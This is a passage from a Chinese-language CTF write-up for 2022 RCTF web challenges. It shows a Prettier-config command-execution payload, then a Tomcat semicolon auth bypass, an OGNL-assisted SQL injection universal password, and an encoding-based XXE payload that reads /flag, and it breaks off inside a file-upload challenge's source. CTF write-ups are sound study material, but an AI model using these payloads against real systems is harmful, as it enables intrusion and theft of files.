<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/x|x/</span>.__proto__.test=<span class="function"><span class="params">()</span>=&gt;</span><span class="literal">true</span>,</span><br><span class="line">module.<span class="built_in">exports</span>=<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;pwd;cat flag&quot;</span>).toString()</span><br></pre></td></tr></table></figure>

<p>中的内容就会被当作.prettierrc文件的内容，然后在index.js中进行解析，从而执行命令</p>
</blockquote>
<blockquote>
<p><code>parser: &quot;.prettierrc&quot;</code>：设置 Prettier 的解析器为 <code>.prettierrc</code>，这意味着 Prettier 会读取和解析 <code>.prettierrc</code> 文件来获取格式化选项。</p>
<p><code>/x|x/.__proto__.test=()=&gt;true</code>：通过修改 <code>RegExp</code> 对象的原型来劫持所有正则表达式的 <code>test()</code> 方法，使其始终返回为<code>true</code>这样就可以使得<code>id</code>绕过<code>fw.js</code>的过滤了，使得可以require任何东西，以至于<code>child_process</code>，正则表达式 <code>/x|x/</code> 可以匹配任何字符串。</p>
<p><code>module.exports=()=&gt;require(&quot;child_process&quot;).execSync(&quot;pwd;cat flag&quot;).toString()</code>：将 <code>module.exports</code> 设置为一个匿名函数，该函数调用一个子进程<code>child_process</code>，然后调用<code>execSync</code> 方法来执行命令 <code>pwd;cat flag</code>，并将当前目录<code>flag</code>作为字符串返回。</p>
</blockquote>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><blockquote>
<p>hint:xxe me,尝试编码绕过 xxe 过滤器</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123144129416.png"><img src="/2022RCTF/image-20230123144129416.png" alt="image-20230123144129416"></a></p>
<p>这是一道xxe的题目，对内容进行了过滤，可以对过滤内容进行编码绕过过滤达到文件内容读取的目的</p>
<p>反汇编jar包，</p>
<p>在<code>com.example.demo.filter.MyFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (isWhite(request) || auth()) &#123;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      response.getWriter().write(<span class="string">&quot;auth fail&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWhite</span><span class="params">(ServletRequest req)</span> &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest)req;</span><br><span class="line">    <span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">auth</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里看到开始页面的<code>auth fail</code>的触发条件</p>
<p><code>if (isWhite(request) || auth())</code></p>
<p>其中</p>
<p><code>auth()</code>是一定返回<code>false</code></p>
<p>所以我们需要让<code>isWhite(request)</code>返回<code>true</code>，才能继续后续步骤</p>
<p>在isWhite()中可知</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.getRequestURI().endsWith(<span class="string">&quot;.ico&quot;</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要<code>URI</code>后以<code>ico</code>结尾，但是又不能访问一个不存在的文件，不然后面的访问都是失败的</p>
<p>这里就需要利用一个知识点</p>
<p><code>Tomcat 以;一种奇怪的方式进行规范化</code></p>
<p>也就是说在<code>;</code>后的不进行解析</p>
<p>于是构造出</p>
<p><code>http://127.0.0.1:8899/index;123.ico</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123151457117.png"><img src="/2022RCTF/image-20230123151457117.png" alt="image-20230123151457117"></a></p>
<p>虽然显示<code>500</code>，但其实是成功了的</p>
</blockquote>
<p>然后就需要考虑如何进行<code>xxe</code>注入</p>
<p>在<code>com.example.demo.controller.DemoController</code>中，正好有个名为<code>xxe</code>的函数</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123153904078.png"><img src="/2022RCTF/image-20230123153904078.png" alt="image-20230123153904078"></a></p>
<p>在<code>xxe</code>函数上面还有个<code>sayHello</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (password.length() &gt; <span class="number">50</span> || password.indexOf(<span class="string">&quot;&#x27;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;not allow&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;not allow&quot;</span>;</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>发现其对<code>password</code>这个参数中的数据也进行了过滤，长度<code>不能超过50</code>个字符，且其中不能有单引号<code>&#39;</code></p>
<p>否则就会失败返回</p>
</blockquote>
<blockquote>
<p>并且在<code>sayHello</code>函数中，还有其他三个参数</p>
<p><code>String poc, String type, String yourclasses</code></p>
<p>这三个参数也是最后传入<code>xxe函数</code>的三个参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> xxe(poc, type, classes);</span><br></pre></td></tr></table></figure>

<p>【但是<code>yourclasses</code>参数被进行了分割，以<code>,</code>为分割，分成4份</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] classes = yourclasses.split(<span class="string">&quot;,&quot;</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<p>所以对<code>yourclasses</code>的参数赋值需要考虑</p>
</blockquote>
<blockquote>
<p>&#x3D;&#x3D;&gt;<code>xxe注入</code>需要四个参数</p>
<p><code>String password, String poc, String type, String yourclasses</code></p>
<p>其中</p>
<ul>
<li><code>password</code>参数值需要绕过单引号（常识猜测是sql注入，以单引号闭合，用万能密码</li>
<li><code>poc</code>参数值按常理应该就是xxe注入的内容</li>
<li><code>type</code>参数值还不太确定</li>
<li><code>yourclasses</code>参数值以<code>,</code>分割为4份，具体值可能就是帮助<code>poc</code>进行绕过过滤的</li>
</ul>
</blockquote>
<p>同样在该类中，底下就是过滤黑名单</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230123154032645.png"><img src="/2022RCTF/image-20230123154032645.png" alt="image-20230123154032645"></a></p>
<blockquote>
<p>可以看到将<code>!DOCTYPE</code>进行了过滤</p>
</blockquote>
<h3 id="password参数"><a href="#password参数" class="headerlink" title="password参数"></a>password参数</h3><p>查找password参数在哪里被利用时</p>
<p>在<code>com.example.demo.mapper.UserProvider</code></p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230124131633821.png"><img src="/2022RCTF/image-20230124131633821.png" alt="image-20230124131633821"></a></p>
<p>发现其果然被<code>sql</code>查询利用 ，以<code>&#39;)</code>闭合</p>
<p>但是单引号被过滤了如何闭合，然后实现万能密码呢</p>
<h4 id="Ognl-注入绕过引用过滤"><a href="#Ognl-注入绕过引用过滤" class="headerlink" title="Ognl 注入绕过引用过滤"></a>Ognl 注入绕过引用过滤</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">@java</span>.lang.Character<span class="meta">@toString(39)</span>&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>简而言之，<code>mybatis</code>会调用<code>OGNL parser</code>来解析<code>sql</code>语句中以 <code>$&#123;&#125;</code> 或者 <code>#&#123;&#125;</code> 中的表达式并将执行结果替换进去</p>
</blockquote>
<p>这里的<code>39</code>就是单引号的<code>ascii</code>编码</p>
<p>于是构造<code>sql</code>注入万能密码</p>
<blockquote>
<p><code>password=1</code><strong><code>$&#123;@java.lang.Character@toString(39)&#125;</code></strong><code>) or 1=1#</code></p>
</blockquote>
<h3 id="poc参数"><a href="#poc参数" class="headerlink" title="poc参数"></a>poc参数</h3><p>先分析一下<code>xxe</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">xxe</span><span class="params">(String b64poc, String type, String[] classes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br><span class="line">    <span class="keyword">if</span> (check(bytepoc)) &#123;</span><br><span class="line">      <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">      <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">      <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">wrappoc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br><span class="line">      <span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br><span class="line">      inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br><span class="line">      <span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>poc</code>传入后变为<code>b64poc</code></p>
<p>然后<code>b64poc</code>进行<code>base64</code>解码，然后<code>check</code>函数进行过滤<code>!DOCTYPE</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytepoc = Base64.getDecoder().decode(b64poc);</span><br></pre></td></tr></table></figure>

<p>这里就提及一个知识点xxe的编码绕过</p>
<blockquote>
<p>一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。</p>
</blockquote>
<p>而一般过滤都是单字符集过滤，利用上面的编码就可以绕过，而且利用上面方式加码的<code>xml</code>文档仍然可以被正常读取解析，</p>
<p>这里将其进行<code>UTF-16</code>加码，于是构造payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;&lt;!DOCTYPE test [ \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;\t&lt;!ENTITY xxe SYSTEM \&quot;file:///flag\&quot;&gt; \n&quot;</span></span><br><span class="line">                + <span class="string">&quot;]&gt; \n&quot;</span>y</span><br><span class="line">                + <span class="string">&quot;&lt;ttoc&gt;&amp;xxe;&lt;/ttoc&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> <span class="string">&quot;UTF-32&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(body.getBytes(type)));</span><br><span class="line">        System.out.println(<span class="string">&quot;poc=&quot;</span>+poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后得到<code>poc</code>的参数值</p>
<blockquote>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA+AAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg==</code></p>
<p>但是发送请求包中<code>base64</code>编码，需要对数据再进行<code>url</code>编码，不然类型<code>=</code>或<code>+</code>会被视为<code>url</code>中的参数和空格符号</p>
<p><code>poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D</code></p>
</blockquote>
<h3 id="type参数"><a href="#type参数" class="headerlink" title="type参数"></a>type参数</h3><p>在<code>xxe</code>函数中，对于<code>type</code>参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (type.equals(<span class="string">&quot;string&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">stringpoc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytepoc);</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; stringpoc &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wrappoc = constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bytepoc &#125;);</span><br><span class="line">      &#125; </span><br></pre></td></tr></table></figure>

<p>似乎对于结果没什么影响，只是对<code>type</code>参数值为不为<code>string</code>时，对<code>wrappoc</code>值有变化【是<code>byte</code>类型的<code>poc</code>参数值，还是<code>string</code>类型的<code>poc</code>参数值】</p>
<p>但是<code>wrappoc</code>参数对后续结果没用影响，猜测<code>type</code>参数值应该可以顺便填，就按其代码赋值也行</p>
<blockquote>
<p><code>type=string</code></p>
</blockquote>
<h3 id="yourclasses参数"><a href="#yourclasses参数" class="headerlink" title="yourclasses参数"></a>yourclasses参数</h3><p><code>yourclasses</code>参数传入<code>xxe</code>函数时，以<code>classes</code>参数名</p>
<p>前面提到过,<code>yourclasses</code>参数以<code>,</code>为分割，分成四份</p>
<p>前两部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>后两部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line">      <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>先分析一下</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/"><strong>java.lang.Class 类</strong></a>的**forName()**方法用于获取具有指定类名的该类的实例。此类名称指定为字符串参数</p>
<p>简而言之，<strong>Class.forName</strong> 方法的作用，就是初始化给定的类。</p>
</blockquote>
<h4 id="classes-0-classes-1"><a href="#classes-0-classes-1" class="headerlink" title="classes[0]&amp;classes[1]"></a>classes[0]&amp;classes[1]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = Class.forName(classes[<span class="number">0</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">1</span>]) &#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码使用了反射机制。它首先使用 <code>Class.forName(classes[0])</code> 方法来获取类的 <code>Class</code> 对象。</p>
<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[1]) &#125;)</code> 方法来获取该类的构造函数。</p>
<p>该方法的参数是一个 <code>Class</code> 数组，表示该构造函数的参数类型。在这里，该构造函数只有一个参数，且其参数的类型是 <code>classes[1]</code> 中所表示的类。最后将获取到的构造函数赋值给 <code>constructor</code> 变量。</p>
<blockquote>
<p>反射机制是 Java 编程语言中一种用于获取类、接口、构造方法、字段、方法等信息的机制。反射机制允许程序在运行时动态地获取、使用、操作类的相关信息。</p>
</blockquote>
</blockquote>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<blockquote>
<p><code>classes[0]</code>：</p>
<p>这个是看其他大佬wp清楚了，这里赋值字节数组 <code>java.io.ByteArrayInputStream</code>,然后<code>bytepoc</code>通过<strong>ByteArrayInputStream转换为输入流</strong>，因为其类中有<code>read()</code>可以读取数据</p>
<p><code>classes[1]</code>：</p>
<p>是数组参数数据类型，根据数组参数类型”<code>[B</code>“ 是表示字节数组<code>byte[]</code> (byte array) 的类型名称。</p>
<blockquote>
<p>在 java 中，数组类型的类型名称会在前面加上 “[“ 符号表示，比如<code>[I</code>代表 int 类型的数组类型名称，但是由于string不是基本数据类型，只能用类表示<code>[Ljava.lang.String;</code></p>
</blockquote>
</blockquote>
<p><strong>所以</strong></p>
<blockquote>
<p><code>classes[0]=java.io.ByteArrayInputStream</code></p>
<p><code>classes[1]=[B</code>   (因为<code>bytepoc</code>为<code>byte</code>数据类型，所以这里传入<code>ByteArrayInputStream</code>类中的构造函数的参数类型也声明为<code>byte</code></p>
</blockquote>
<h4 id="classes-2-classes-3"><a href="#classes-2-classes-3" class="headerlink" title="classes[2]&amp;classes[3]"></a>classes[2]&amp;classes[3]</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inputSource = Class.forName(classes[<span class="number">2</span>]).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class.forName(classes[<span class="number">3</span>]) &#125;).newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; wrappoc &#125;);</span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> builder.parse(inputSource);</span><br></pre></td></tr></table></figure>

<p>这里的<code>inputSource</code>参数是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line">...</span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>



<p>这段代码首先使用 <code>Class.forName(classes[2])</code> 方法来获取第三个参数所表示的类的 <code>Class</code> 对象，在这里是 <code>org.xml.sax.InputSource</code> 类，这个类是 <code>SAX (Simple API for XML)</code> 中用于读取 <code>XML</code> 文档的一个类。</p>
<p>然后使用 <code>getDeclaredConstructor(new Class[] &#123; Class.forName(classes[3]) &#125;)</code> 方法来获取该类的构造函数，在这里是 <code>org.xml.sax.InputSource</code> 类的构造函数，接受一个参数是 <code>classes[3]</code> 所表示的类。</p>
<p>之后使用 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法来创建一个 <code>org.xml.sax.InputSource</code> 类型的实例，使用参数值为 <code>wrappoc</code> 的构造函数来创建这个实例。</p>
<p>接着使用 <code>builder.parse(inputSource)</code> 方法来解析 <code>inputSource</code> 对象，这里的 <code>builder</code> 是 <code>DocumentBuilder</code> 类型的对象，<code>DocumentBuilder</code> 是 <code>javax.xml.parsers</code> 包中提供的一个类，其作用是创建 <strong>DOM 解析器</strong>，用于<code>解析 XML 文档</code></p>
<p>&#x3D;&#x3D;&gt;</p>
<p><code>inputSource</code>值为恶意xml文件内容</p>
<p><code>doc</code>值为解析恶意xml文件后得到的内容</p>
</blockquote>
<p>在代码还有一段实现打印的代码，这段代码就完成了把<code>doc</code>中解析恶意xml文档后得到的内容，打印输出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">NodeList</span> <span class="variable">nodes</span> <span class="operator">=</span> doc.getChildNodes();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nodes.getLength(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nodes.item(i).getNodeType() == <span class="number">1</span>) &#123;</span><br><span class="line">          res = res + nodes.item(i).getTextContent();</span><br><span class="line">          System.out.println(nodes.item(i).getTextContent());</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>这段代码首先使用 <code>doc.getChildNodes()</code> 方法获取文档中的所有子节点，并将它们存储在 <code>NodeList</code> 对象中。</p>
<p>然后使用一个 <code>for</code> 循环来遍历 <code>NodeList</code> 中的每个子节点。在每次循环中，使用 <code>nodes.item(i)</code> 方法获取当前遍历到的子节点。</p>
<p>之后使用 <code>if</code> 语句来检查当前子节点的类型。如果该类型为<code>1</code> (即元素节点)，则使用 <code>nodes.item(i).getTextContent()</code> 方法获取该元素节点的文本内容并将其加到 <code>res</code> 变量中。然后使用 <code>System.out.println(nodes.item(i).getTextContent())</code> 方法将该文本内容打印到控制台。</p>
<p><strong>总的来说</strong>，这段代码用于遍历文档中所有子节点，并将所有元素节点的文本内容提取出来并存储在 res 变量中，同时将其打印到控制台。</p>
<p>这段代码通过遍历<code>doc</code>中的所有子节点,并将所有元素节点的文本内容获取出来并存储在<code>res</code>变量中,同时将其打印到控制台(这段代码在爬虫领域很常用来提取网页中的文本内容)</p>
</blockquote>
<p><strong>所以</strong></p>
<blockquote>
<p><code>classes[2]=org.xml.sax.InputSource</code></p>
<p>&#x2F;&#x2F;这里为<code>org.xml.sax.InputSource</code>类，用于读取xml文件，将其转化为可解析的xml格式，便于后面进行</p>
<p><code>classes[3]=java.io.InputStream</code>     </p>
<p>&#x2F;&#x2F;<code>java.io.ByteArrayInputStream</code>是<code>java.io.InputStream</code>的子类，但是<code>java.io.ByteArrayInputStream</code>不能直接作为构造函数的参数传入 <code>org.xml.sax.InputSource</code> 类的构造函数,因为<code>org.xml.sax.InputSource</code>和 <code>java.io.InputStream</code> 之间并没有继承关系。</p>
<p>&#x2F;&#x2F;如果<code>classes[3]=java.io.ByteArrayInputStream</code>，会导致程序在执行 <code>newInstance(new Object[] &#123; wrappoc &#125;)</code> 方法时出现异常,因为类型不匹配，</p>
<p>除非<code>ByteArrayInputStream</code>转换为<code>InputStream</code> 类型的对象才能传入 <code>org.xml.sax.InputSource</code> 类的构造函数</p>
</blockquote>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><blockquote>
<p><code>password=1$&#123;@java.lang.Character@toString(39)&#125;) or 1=1#&amp;poc=AAAAPAAAACEAAABEAAAATwAAAEMAAABUAAAAWQAAAFAAAABFAAAAIAAAAHQAAABlAAAAcwAAAHQAAAAgAAAAWwAAACAAAAAKAAAACQAAADwAAAAhAAAARQAAAE4AAABUAAAASQAAAFQAAABZAAAAIAAAAHgAAAB4AAAAZQAAACAAAABTAAAAWQAAAFMAAABUAAAARQAAAE0AAAAgAAAAIgAAAGYAAABpAAAAbAAAAGUAAAA6AAAALwAAAC8AAAAvAAAAZgAAAGwAAABhAAAAZwAAACIAAAA%2BAAAAIAAAAAoAAABdAAAAPgAAACAAAAAKAAAAPAAAAHcAAABzAAAAdwAAAD4AAAAmAAAAeAAAAHgAAABlAAAAOwAAADwAAAAvAAAAdwAAAHMAAAB3AAAAPg%3D%3D&amp;type=&quot;string&quot;&amp;yourclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230125004553248.png"><img src="/2022RCTF/image-20230125004553248.png" alt="image-20230125004553248"></a></p>
<h2 id="filecheacker-mini"><a href="#filecheacker-mini" class="headerlink" title="filecheacker_mini"></a>filecheacker_mini</h2><blockquote>
<p>hint:<code>Just an easy file check challenge~~~</code><br><code>The challenging environment restarts every three minutes</code></p>
<p>只是一个简单的文件检查挑战~~~<br>具有挑战性的环境每三分钟</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230312163758682.png"><img src="/2022RCTF/image-20230312163758682.png" alt="image-20230312163758682"></a></p>
<p> 似乎是一个文件上传的环境，</p>
<p>先分析一下它的网站启动脚本<code>app.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">from</span> waitress <span class="keyword">import</span> serve</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app_dir = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;app_dir&#125;</span>/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,result=<span class="string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file-upload&#x27;</span>]</span><br><span class="line">            filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(filepath) <span class="keyword">and</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=<span class="string">&quot;Don&#x27;t 